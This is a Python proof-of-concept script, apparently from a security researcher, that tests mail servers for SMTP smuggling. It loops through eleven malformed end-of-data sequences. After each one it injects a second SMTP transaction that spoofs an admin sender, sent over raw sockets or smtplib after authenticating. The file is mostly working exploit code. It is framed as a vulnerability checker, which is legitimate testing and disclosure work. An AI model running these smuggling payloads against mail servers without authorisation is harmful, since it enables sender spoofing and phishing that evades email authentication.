#!/bin/python3

#
#
#    _____  __  ___ ______ ____     _____                                  __               ____   ____   ______
#   / ___/ /  |/  //_  __// __ \   / ___/ ____ ___   __  __ ____ _ ____ _ / /___   _____   / __ \ / __ \ / ____/
#   \__ \ / /|_/ /  / /  / /_/ /   \__ \ / __ `__ \ / / / // __ `// __ `// // _ \ / ___/  / /_/ // / / // /     
#  ___/ // /  / /  / /  / ____/   ___/ // / / / / // /_/ // /_/ // /_/ // //  __// /     / ____// /_/ // /___   
# /____//_/  /_/  /_/  /_/       /____//_/ /_/ /_/ \__,_/ \__, / \__, //_/ \___//_/     /_/     \____/ \____/   
#                                                        /____/ /____/                                          

# SMTP Smuggler PoC Script v0.1 for checking mailservers - 2024 - by suuhmer
#
# --------------------------------------------------------------------
#
# SMTP_SMUGGLER_POC Checker v0.1 
# All rights reserved - (c) 2024 - suuhm
#
# --------------------------------------------------------------------
#

import socket
import ssl
import base64
import argparse
import getpass
import time
import smtplib


#
# GLOBASL VARS AND SETTINGS:
# --------------------------
email_subject = 'Subject: Your Subject'
email_body_one = 'Here is the text of your email'
admin_from = 'admin@mailserver.com'
end_of_data_command = '\r\n.\r\n'


#Smgggling Strings (0-10):
#smtp_smuggle_escape = \r\n.\r
#smtp_smuggle_escape = '\r\n\x00.\r'
#smtp_smuggle_escape = '\r\n\x00.\n'
#smtp_smuggle_escape = \r\n\x00.\r\n
#smtp_smuggle_escape = \r\n.\x00\r\n
#smtp_smuggle_escape = '\r\n.'
#smtp_smuggle_escape = \n.\r\n
#smtp_smuggle_escape = \r.\r\n
#smtp_smuggle_escape = \n\n.\r\n
#smtp_smuggle_escape = \r\n.\r
#smtp_smuggle_escape = \n.\n

smtp_test_nr = 0
smtp_smuggle_escapes = [
    '\r\n.\r',
    '\r\n\x00.\r',
    '\r\n\x00.\n',
    '\r\n\x00.\r\n',
    '\r\n.\x00\r\n',
    '\r\n.',
    '\n.\r\n',
    '\r.\r\n',
    '\n\n.\r\n',
    '\r\n.\r',
    '\n.\n'
]

# -------------------------------------------------



def resolve_domainname(server):
    try:
        domain_name = server
        info = socket.getaddrinfo(domain_name, None)
        server = info[0][4][0]
        print(f'Try to resolve {domain_name} to ip: {server}')
    except socket.gaierror as e:
        print(f'Error by domain resolve: {domain_name}: {e}')



#
# RAW SOCKET
# ----------
#
def send_smtp_command(command, sock):
    cmd = (command + '\r\n').encode('utf-8')
    print('[SEND] >> ' + str(cmd))
    sock.send(cmd)
    time.sleep(1)
    response = sock.recv(1024).decode('utf-8')
    print('[RESP] << ' + response)
    return response


def send_socket_raw_mail(server,port,username,password,rcpt,smtp_smuggle_escape):

    if port == 587 or port == 443:
        with socket.create_connection((server, port)) as wsock:
            # SSL/TLS-Handshake
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            #context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
            context.minimum_version = ssl.TLSVersion.TLSv1_2
            context.maximum_version = ssl.TLSVersion.TLSv1_2
            #context.check_hostname = False

            #context.set_ciphers(DEFAULT_CIPHERS)
            # TLSv1.3 with cipher TLS_AES_256_GCM_SHA384
            context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384')

            # Wrap the socket with SSL/TLS
            with context.wrap_socket(wsock, server_hostname=server) as sock:
                print('[:D] EHLO')
                ehlo_command = f'EHLO testsmtp.{server}'
                print(f'Send command {ehlo_command}')
                send_smtp_command(ehlo_command, sock)
                #time.sleep(2.7)

                print('STARTTLS-Handshake at port 25 only?')
                starttls_command = 'STARTTLS'
                send_smtp_command(starttls_command, sock)
                time.sleep(1.4)
                send_smtp_command(ehlo_command, sock)

                #print(f'[*] Aut with {username} and {password} AUTH PLAIN')
                auth_data = "\0{}\0{}".format(username, password)
                auth_command = 'AUTH PLAIN {}'.format(base64.b64encode(auth_data.encode()).decode())
                #print(auth_command)
                send_smtp_command(auth_command, sock)
                time.sleep(1.4)

                print('[*] Mail sending...')
                mail_from_command = f'MAIL FROM: {username}'
                send_smtp_command(mail_from_command, sock)
                time.sleep(1.1)

                rcpt_to_command = f'RCPT TO: {rcpt}'
                send_smtp_command(rcpt_to_command, sock)
                time.sleep(1.1)

                #manual_input = f'{email_subject}\r\n{email_body}\r\n{end_of_data_command}'
                manual_input = f"""\
From: Me <{username}>\r\n\
To: You <{rcpt}>\r\n\
{email_subject} <{smtp_test_nr}>\r\n\r\n\
{email_body_one}\
{smtp_smuggle_escape}
mail From: {admin_from}\r\n\
rcpt To: {rcpt}\r\n\
data\r\n\
From: admin <{admin_from}>\r\n\
To: rcptuser <{rcpt}>\r\n\
Subject: Hello_admin <{smtp_test_nr}>\r\n\r\n\
hello got my foo\r\n\
\r\n.\r\n\
"""

                send_smtp_command(manual_input, sock)
                
                quit_command = 'QUIT'
                send_smtp_command(quit_command, sock)


    elif port == 25 or port == 5870000:
        # FALLBACK NOSSL ON LOCAL 587 TESTING:
        if port == 5870000:
            port = 587

        with socket.create_connection((server, port)) as sock:
            print('[:D] EHLO')
            ehlo_command = f'EHLO testsmtp.{server}'
            print(f'Send command {ehlo_command}')
            send_smtp_command(ehlo_command, sock)
            #time.sleep(2.7)

            auth_data = "\0{}\0{}".format(username, password)
            auth_command = 'AUTH PLAIN {}'.format(base64.b64encode(auth_data.encode()).decode())
            #auth_command = 'AUTH LOGIN {}'.format(base64.b64encode(auth_data.encode()).decode())
            #print(auth_command)
            send_smtp_command(auth_command, sock)
            time.sleep(0.8)

            print('[*] Mail sending...')
            mail_from_command = f'MAIL FROM: {username}'
            send_smtp_command(mail_from_command, sock)
            time.sleep(0.2)

            rcpt_to_command = f'RCPT TO: {rcpt}'
            send_smtp_command(rcpt_to_command, sock)
            time.sleep(0.2)

            data_command = 'DATA'
            send_smtp_command(data_command, sock)

            # manual_input = (
            #                 f'From: Me <{username}>\r\n' +
            #                 f'To: You <{rcpt}>\r\n' +
            #                 f'{email_subject} - Sequence: (test)\r\n' +
            #                 email_body_one +
            #                 smtp_smuggle_escape +
            #                 f'mail From: {admin_from}\r\n' +
            #                 f'rcpt To: {rcpt}\r\n' +
            #                 'data\r\n' +
            #                 f'From: admin <{admin_from}>\r\n' +
            #                 f'To: rcptuser <{rcpt}>\r\n' +
            #                 'Subject: Hello call me admin\r\n' +
            #                 'got it foo' +
            #                 '\r\n.'
            #                 )
            manual_input = f"""\
From: Me <{username}>\r\n\
To: You <{rcpt}>\r\n\
{email_subject} <{smtp_test_nr}>\r\n\r\n\
{email_body_one}\
{smtp_smuggle_escape}
mail From: {admin_from}\r\n\
rcpt To: {rcpt}\r\n\
data\r\n\
From: admin <{admin_from}>\r\n\
To: rcptuser <{rcpt}>\r\n\
Subject: Hello_admin <{smtp_test_nr}>\r\n\r\n\
hello got my foo\r\n\
\r\n.\r\n\
"""

            send_smtp_command(manual_input.rstrip("\n"), sock)
            
            quit_command = 'QUIT'
            send_smtp_command(quit_command, sock)

    else:

        import sys
        print('Port not supported yet or no mailserver conform')
        sys.exit(0)




def send_mail(smtp_server, port, username, password, rcpt, smtp_smuggle_escape ,sdebug=True):

    context = ssl.create_default_context()

    with smtplib.SMTP(smtp_server, port) as server:
        #Debugging
        if sdebug == True:
            server.set_debuglevel(1)
        else:
            server.set_debuglevel(0)

        server.starttls(context=context)
        server.ehlo()

        # Auth:
        #Debugging purposes only:
        #print(f'[*] Auth with {username} and {password} AUTH PLAIN')
        auth_plain = base64.b64encode(f'\0{username}\0{password}'.encode()).decode()
        try:
            server.docmd('AUTH', 'PLAIN ' + auth_plain)
        except Exception as e:
            print(f"login failed:: {e}")


        print('[*] Mail sending...')
        #mail_from_command = f'MAIL FROM: {username}'
        server.mail(username)

        #rcpt_to_command = f'RCPT TO: {rcpt}'
        server.rcpt(rcpt)

        data_command = 'DATA'
        
        #manual_input = f'{email_subject}\r\n{email_body}\r\n{end_of_data_command}'
        # manual_input = (
        #                 'DATA\r\n' +
        #                 f'From: Me <{username}>\r\n' +
        #                 f'To: You <{rcpt}>\r\n' +
        #                 f'{email_subject} - Sequence: ({smtp_smuggle_escape})\r\n' +
        #                 email_body_one +
        #                 smtp_smuggle_escape +
        #                 f'mail From: {admin_from}\r\n' +
        #                 f'rcpt To: {rcpt}\r\n' +
        #                 'data\r\n' +
        #                 f'From: admin <{admin_from}>\r\n' +
        #                 f'To: rcptuser <{rcpt}>\r\n' +
        #                 'Subject: Hello call me admin\r\n' +
        #                 'got it foo'
        #                 )
        manual_input = f"""\
DATA\r\n\
From: Me <{username}>\r\n\
To: You <{rcpt}>\r\n\
{email_subject} <{smtp_test_nr}>\r\n\r\n\
{email_body_one}\
{smtp_smuggle_escape}
mail From: {admin_from}\r\n\
rcpt To: {rcpt}\r\n\
data\r\n\
From: admin <{admin_from}>\r\n\
To: rcptuser <{rcpt}>\r\n\
Subject: Hello_admin <{smtp_test_nr}>\r\n\r\n\
hello got my foo\r\n\
\r\n.\r\n\
"""

        bytes_input = manual_input.encode('utf-8')
        #server.sendmail(mail_from_command, rcpt_to_command, bytes_input)
        server.send(manual_input)
        server.quit()



def main():

    banner = """
       _____  __  ___ ______ ____     _____                                  __               ____   ____   ______
      / ___/ /  |/  //_  __// __ \   / ___/ ____ ___   __  __ ____ _ ____ _ / /___   _____   / __ \ / __ \ / ____/
      \__ \ / /|_/ /  / /  / /_/ /   \__ \ / __ `__ \ / / / // __ `// __ `// // _ \ / ___/  / /_/ // / / // /     
     ___/ // /  / /  / /  / ____/   ___/ // / / / / // /_/ // /_/ // /_/ // //  __// /     / ____// /_/ // /___   
    /____//_/  /_/  /_/  /_/       /____//_/ /_/ /_/ \__,_/ \__, / \__, //_/ \___//_/     /_/     \____/ \____/   
                                                           /____/ /____/                                          
    
    SMTP Smuggle PoC Script v0.1 for checking mailservers - 2024 - by suuhmer

    """
    print(banner)


    # Server and Port of (local) Postfix-Servers
    #sserver = '127.0.0.1'
    sserver = 'mail.servername.com'
    sport = 25
    #sport = 587

    susername = 'info@severname.com'
    spassword = 'CHANGE_ME'
    srcpt = 'test@test.com'

    parser = argparse.ArgumentParser(description='Send mail with TLS und AUTH PLAIN.')
    parser.add_argument('--server', type=str, default=sserver, help='SMTP-Servername DNS or IP')
    parser.add_argument('--port', type=int, default=sport, help='SMTP-Serverport (Use 5870000 for 587 NOSSL)')
    parser.add_argument('--user', type=str, default=susername, help='SMTP-userername')
    parser.add_argument('--rcpt', type=str, default=srcpt, help='rcpt address')
    parser.add_argument('--mode', type=str, default='def', help='Rawmode = raw or Default = def')
    args = parser.parse_args()

    password = getpass.getpass(prompt='Enter password: ')
    #For static pw testing. Risky! ;)
    #password = spassword

    server = args.server
    port = args.port
    username = args.user
    rcpt = args.rcpt
    global smtp_test_nr

    #resolve_domainname(server)

    for es in smtp_smuggle_escapes:
        print(f'\n  -----\n[*] Trying with smuggle escape payload: ({repr(es)})\n  -----\n')
        time.sleep(1.6)

        if args.mode == 'def':
            try:
                send_mail(server, port, username, password, rcpt, es, True)
                print('E-Mail successfully sent.')
                smtp_test_nr+=1
        
            except Exception as e:
                print(f"Error sending: {e}")
        elif args.mode == 'raw':
            try:
                send_socket_raw_mail(server, port, username, password, rcpt, es)
                print('E-Mail successfully sent.')
                smtp_test_nr+=1
        
            except Exception as e:
                print(f"Error sending: {e}")

        

if __name__ == "__main__":
    main()
    
